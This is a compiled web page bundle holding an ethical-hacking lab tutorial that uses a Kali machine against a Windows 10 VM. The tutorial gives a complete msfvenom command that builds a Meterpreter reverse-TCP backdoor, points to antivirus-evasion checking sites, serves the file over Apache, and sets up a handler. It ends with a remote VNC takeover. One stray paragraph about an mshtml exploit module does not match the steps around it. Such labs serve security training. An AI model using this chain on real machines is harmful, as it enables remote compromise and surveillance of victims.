import{_ as t,c as a,a1 as s,o as i}from"./chunks/framework.BDxlaA_J.js";const m=JSON.parse('{"title":"Exploiting Client Side Vulnerabilities and Establishing a VNC session","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md","filePath":"categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md"}'),r={name:"categories/ethical-hacking-labs/5-system-hacking/4-VNC-Session.md"};function o(n,e,c,l,h,p){return i(),a("div",null,e[0]||(e[0]=[s(`<h1 id="exploiting-client-side-vulnerabilities-and-establishing-a-vnc-session" tabindex="-1">Exploiting Client Side Vulnerabilities and Establishing a VNC session <a class="header-anchor" href="#exploiting-client-side-vulnerabilities-and-establishing-a-vnc-session" aria-label="Permalink to &quot;Exploiting Client Side Vulnerabilities and Establishing a VNC session&quot;">​</a></h1><p>Attackers use client-side vulnerabilities to exploit unpatched software, thereby attaining access to the machine on which the software is installed.</p><p>VNC enables attackers to remotely access and control computers targeted from another computer or mobile device, wherever they are in the world. At the same time, it is also used by administrator and organizations throughout every industry sector for a range of different scenarios and use cases, including providing IT desktop support to colleagues and friends, and accessing systems and services on the move.</p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>How to exploit client-side vulnerabilities and establish a VNC session.</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Kali Linux virtual machine (Attacker).</li><li>Windows 10 virtual machine (Target).</li></ul><h2 id="launch-metasploit-framework" tabindex="-1">Launch Metasploit Framework <a class="header-anchor" href="#launch-metasploit-framework" aria-label="Permalink to &quot;Launch Metasploit Framework&quot;">​</a></h2><p>Launch Kali Linux and open the Terminal window and type:</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.2.42 LPORT=444 -o /root/Desktop/Test.exe</code></p><p><strong>Note</strong>: LHOST is the IP address of your Kali machine.</p><p>This command will generate Test.exe, a malicious file on Desktop as shown in below:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>No encoder or badchars specified, outputting raw payload</span></span>
<span class="line"><span>Payload size: 341 bytes</span></span>
<span class="line"><span>Final size of exe file: 73802 bytes</span></span>
<span class="line"><span>Saved as: /root/Desktop/Test.exe</span></span></code></pre></div><p>You can also try this by using the <code>msfconsole</code>.</p><p>To check the malicious file that you created, go to <a href="https://nodistribute.com/" target="_blank" rel="noreferrer">https://nodistribute.com/</a> or <a href="https://antiscan.me" target="_blank" rel="noreferrer">https://antiscan.me</a> and upload the file:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0e16bfcaba630b14ba1efa3ca24e061158247558/antiscan.png" alt="AntiScan.Me"></p><p>This site will perform a scan over 20 AV softwares databases. <strong>Do not upload your backdoors or any file to virusTotal.</strong></p><h2 id="share-the-malicious-file-on-target" tabindex="-1">Share the malicious file on target <a class="header-anchor" href="#share-the-malicious-file-on-target" aria-label="Permalink to &quot;Share the malicious file on target&quot;">​</a></h2><p>Now create a directory to share this file with the target machine provide the permissions and copy the file from Desktop to shared location:</p><p>Create a directory on html folder: <code>mkdir /var/www/html/share/</code></p><p>Change the mode for the share to <strong>755</strong>: <code>chmod -R 755 /var/www/html/share/</code></p><p>Change the ownership of that folder to <strong>www-data</strong>: <code>chown -R www-data:www-data /var/www/html/share/</code></p><p>Now copy the malicious file to the shared location: <code>cp /root/Desktop/Test.exe /var/www/html/share/</code></p><p>Next, start the apache service: <code>service apache2 start</code></p><p>Open a new terminal window and type <code>msfconsole</code> to launch Metasploit Framework.</p><p>Use the <code>multi/handler</code> to capture the session.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3f818aa7902d7d0c864577c885b2a16c1b5caa33/msfconsole.png" alt="msfconsole"></p><p>In msfconsole:</p><ol><li><code>use multi/handler</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li>set the <code>LHOST</code> to your Kali IP address and <code>LPORT</code> to 444</li><li><code>run</code> the exploit</li></ol><h4 id="reverse-tcp" tabindex="-1">Reverse TCP <a class="header-anchor" href="#reverse-tcp" aria-label="Permalink to &quot;Reverse TCP&quot;">​</a></h4><p>A reverse shell (also known as a connect-back) is the exact opposite: it requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally the attacker receives the shell.</p><p>This module exploits memory corruption vulnerability within Microsoft&#39;s HTML engine (mshtml). When parsing an HTML page containing a recursive CSS import, a C++ object is deleted and later reused.</p><h2 id="on-windows-machine" tabindex="-1">On Windows machine <a class="header-anchor" href="#on-windows-machine" aria-label="Permalink to &quot;On Windows machine&quot;">​</a></h2><p>Remember to deactivate all Windows Defender parameters.</p><p>Launch the browser and type the IP address of the Kali machine that are running apache webserver and download the <strong>Test.exe</strong>.</p><p>In my case is <code>http://10.0.2.42/share</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/48fe2ec77ebde90c0febb208704e4172b60b4428/testexe.png" alt="Test.Exe"></p><p>Double click <strong>Test.exe</strong>. You will get a Security Warning window, click <strong>run</strong>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png" alt="Sec Warning"></p><h2 id="meterpreter" tabindex="-1">Meterpreter <a class="header-anchor" href="#meterpreter" aria-label="Permalink to &quot;Meterpreter&quot;">​</a></h2><p>Switch to Kali Linux machine and check if there is any session that are opened in the Meterpreter Shell as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/meterpreter.png" alt="meterpreter"></p><p>Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.</p><p>Useful commands: <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" target="_blank" rel="noreferrer">https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</a></p><p>About Meterpreter: <a href="https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/" target="_blank" rel="noreferrer">https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/</a></p><h2 id="remote-view-in-kali-linux" tabindex="-1">Remote View in Kali Linux <a class="header-anchor" href="#remote-view-in-kali-linux" aria-label="Permalink to &quot;Remote View in Kali Linux&quot;">​</a></h2><p>Now, you can create a VNC session on Windows 10 machine remotely by typing:</p><p><code>run vnc</code></p><p>This command will open a VNC session of the Target&#39;s machine as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/78278f30571b9988b108c92defcd91134886c404/vnc.png" alt="vnc"></p><p>Useful links:</p><ul><li><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf" target="_blank" rel="noreferrer">Metasploit Cheat Sheet - SANS</a></li><li><a href="https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf" target="_blank" rel="noreferrer">Meterpreter Cheat Sheet</a></li><li><a href="https://widesecurity.net/linux/msfvenom-cheat-sheet/" target="_blank" rel="noreferrer">Msfvenom Cheat Sheet</a></li></ul>`,52)]))}const u=t(r,[["render",o]]);export{m as __pageData,u as default};
